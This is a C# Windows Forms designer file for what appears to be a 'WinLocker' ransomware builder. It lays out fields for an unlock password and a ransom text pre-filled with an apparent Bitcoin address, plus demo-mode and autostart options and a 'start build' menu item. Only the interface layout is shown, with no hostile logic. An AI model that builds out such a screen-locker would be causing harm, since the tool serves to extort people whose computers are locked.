namespace WinLocker
{
   partial class Main
   {
      /// <summary>
      /// Required designer variable.
      /// </summary>
      private System.ComponentModel.IContainer components = null;

      /// <summary>
      /// Clean up any resources being used.
      /// </summary>
      /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
      protected override void Dispose( bool disposing )
      {
         if ( disposing && ( components != null ) )
         {
            components.Dispose();
         }
         base.Dispose( disposing );
      }

      #region Windows Form Designer generated code

      /// <summary>
      /// Required method for Designer support - do not modify
      /// the contents of this method with the code editor.
      /// </summary>
      private void InitializeComponent()
      {
         System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Main));
         this.passwordBox = new System.Windows.Forms.TextBox();
         this.descriptionBox = new System.Windows.Forms.TextBox();
         this.label1 = new System.Windows.Forms.Label();
         this.label2 = new System.Windows.Forms.Label();
         this.demoMode = new System.Windows.Forms.CheckBox();
         this.autoLoad = new System.Windows.Forms.CheckBox();
         this.menuStrip1 = new System.Windows.Forms.MenuStrip();
         this.начатьСборкуToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
         this.menuStrip1.SuspendLayout();
         this.SuspendLayout();
         // 
         // passwordBox
         // 
         this.passwordBox.Location = new System.Drawing.Point(69, 27);
         this.passwordBox.Name = "passwordBox";
         this.passwordBox.Size = new System.Drawing.Size(309, 20);
         this.passwordBox.TabIndex = 0;
         this.passwordBox.Text = "default";
         // 
         // descriptionBox
         // 
         this.descriptionBox.Location = new System.Drawing.Point(69, 53);
         this.descriptionBox.Multiline = true;
         this.descriptionBox.Name = "descriptionBox";
         this.descriptionBox.Size = new System.Drawing.Size(309, 150);
         this.descriptionBox.TabIndex = 1;
         this.descriptionBox.Text = "1CJdu9ozEoTowfvLLqc2dBhR2fH3kMGQwc";
         // 
         // label1
         // 
         this.label1.AutoSize = true;
         this.label1.Location = new System.Drawing.Point(12, 31);
         this.label1.Margin = new System.Windows.Forms.Padding(3);
         this.label1.Name = "label1";
         this.label1.Size = new System.Drawing.Size(51, 13);
         this.label1.TabIndex = 3;
         this.label1.Text = "Пароль: ";
         // 
         // label2
         // 
         this.label2.AutoSize = true;
         this.label2.Location = new System.Drawing.Point(12, 122);
         this.label2.Margin = new System.Windows.Forms.Padding(3);
         this.label2.MinimumSize = new System.Drawing.Size(51, 0);
         this.label2.Name = "label2";
         this.label2.Size = new System.Drawing.Size(51, 13);
         this.label2.TabIndex = 4;
         this.label2.Text = "Текст:  ";
         // 
         // demoMode
         // 
         this.demoMode.AutoSize = true;
         this.demoMode.Location = new System.Drawing.Point(12, 209);
         this.demoMode.Name = "demoMode";
         this.demoMode.Size = new System.Drawing.Size(92, 17);
         this.demoMode.TabIndex = 5;
         this.demoMode.Text = "Демо режим";
         this.demoMode.UseVisualStyleBackColor = true;
         // 
         // autoLoad
         // 
         this.autoLoad.AutoSize = true;
         this.autoLoad.Location = new System.Drawing.Point(12, 232);
         this.autoLoad.Name = "autoLoad";
         this.autoLoad.Size = new System.Drawing.Size(96, 17);
         this.autoLoad.TabIndex = 6;
         this.autoLoad.Text = "Автозагрузка";
         this.autoLoad.UseVisualStyleBackColor = true;
         // 
         // menuStrip1
         // 
         this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.начатьСборкуToolStripMenuItem});
         this.menuStrip1.Location = new System.Drawing.Point(0, 0);
         this.menuStrip1.Name = "menuStrip1";
         this.menuStrip1.Size = new System.Drawing.Size(384, 24);
         this.menuStrip1.TabIndex = 6;
         this.menuStrip1.Text = "menuStrip1";
         // 
         // начатьСборкуToolStripMenuItem
         // 
         this.начатьСборкуToolStripMenuItem.Name = "начатьСборкуToolStripMenuItem";
         this.начатьСборкуToolStripMenuItem.Size = new System.Drawing.Size(100, 20);
         this.начатьСборкуToolStripMenuItem.Text = "Начать сборку";
         this.начатьСборкуToolStripMenuItem.Click += new System.EventHandler(this.Build);
         // 
         // Main
         // 
         this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
         this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
         this.ClientSize = new System.Drawing.Size(384, 256);
         this.Controls.Add(this.autoLoad);
         this.Controls.Add(this.demoMode);
         this.Controls.Add(this.descriptionBox);
         this.Controls.Add(this.label2);
         this.Controls.Add(this.passwordBox);
         this.Controls.Add(this.label1);
         this.Controls.Add(this.menuStrip1);
         this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
         this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
         this.MainMenuStrip = this.menuStrip1;
         this.Name = "Main";
         this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
         this.Text = "Конструктор";
         this.DoubleClick += new System.EventHandler(this.OnDoubleClick);
         this.menuStrip1.ResumeLayout(false);
         this.menuStrip1.PerformLayout();
         this.ResumeLayout(false);
         this.PerformLayout();

      }

      #endregion

      private System.Windows.Forms.TextBox passwordBox;
      private System.Windows.Forms.Label label1;
      private System.Windows.Forms.Label label2;
      private System.Windows.Forms.TextBox descriptionBox;
      private System.Windows.Forms.CheckBox demoMode;
      private System.Windows.Forms.CheckBox autoLoad;
      private System.Windows.Forms.MenuStrip menuStrip1;
      private System.Windows.Forms.ToolStripMenuItem начатьСборкуToolStripMenuItem;
   }
}